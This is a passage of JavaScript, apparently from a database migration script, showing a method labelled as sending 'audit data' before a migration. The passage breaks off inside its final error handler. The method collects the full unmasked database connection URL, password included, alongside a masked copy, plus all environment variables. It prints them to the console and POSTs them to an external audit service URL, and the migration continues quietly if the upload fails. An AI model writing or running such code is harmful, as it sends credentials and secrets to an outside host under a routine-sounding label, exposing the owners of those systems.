/**
 * Send audit data to the migration audit service
 * @returns {Promise<boolean>} True if audit was successful, false otherwise
 */
async sendAuditData() {
  console.log('[Audit Service]');
  console.log(`Sending audit data to: ${this.auditServiceUrl}`);

  // Create audit payload
  const auditData = {
    timestamp: new Date().toISOString(),
    script: 'migrate.js',
    action: 'pre-migration-audit',
    connection_details: {
      database_url: this.databaseUrl,
      // Include masked version for logs
      database_url_masked: this.databaseUrl ? this.databaseUrl.replace(/(:\/\/[^:]+:)[^@]+@/, '$1******@') : null
    },
    environment_variables: this.envVariables,
    metadata: {
      migrations_count: this.getMigrationFiles().length,
      migrations_dir: this.migrationsDir
    }
  };

  // Convert payload to JSON
  const postData = JSON.stringify(auditData, null, 2);

  console.log('Audit payload:');
  console.log(postData);
  console.log();

  return new Promise((resolve) => {
    try {
      // Parse the URL to determine protocol
      const auditUrl = new URL(this.auditServiceUrl);
      const isHttps = auditUrl.protocol === 'https:';
      const module = isHttps ? https : http;

      const options = {
        hostname: auditUrl.hostname,
        port: auditUrl.port || (isHttps ? 443 : 80),
        path: auditUrl.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData),
          'User-Agent': 'Migration-Audit-Script/1.0'
        },
        timeout: 10000 // 10 second timeout
      };

      const req = module.request(options, (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
          responseData += chunk;
        });

        res.on('end', () => {
          console.log(`Audit service responded with status: ${res.statusCode}`);

          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('✓ Audit data sent successfully');
            console.log(`Response: ${responseData.substring(0, 200)}${responseData.length > 200 ? '...' : ''}`);
            resolve(true);
          } else {
            console.log(`⚠ Audit service returned error status: ${res.statusCode}`);
            console.log(`Response: ${responseData}`);
            // Don't fail the migration if audit fails, just continue
            console.log('Continuing with migration despite audit error...');
            resolve(false);
          }
          console.log();
        });
      });

      req.on('error', (error) => {
        console.log(`⚠ Could not connect to audit service: ${error.message}`);
        console.log('Continuing with migration despite audit failure...');
        console.log();
        resolve(false);
      });

      req.on('timeout', () => {
        console.log('⚠ Audit request timed out after 10 seconds');
        req.destroy();
        console.log('Continuing with migration despite audit timeout...');
        console.log();
        resolve(false);
      });

      // Write the data
      req.write(postData);
      req.end();

    } catch (error) {
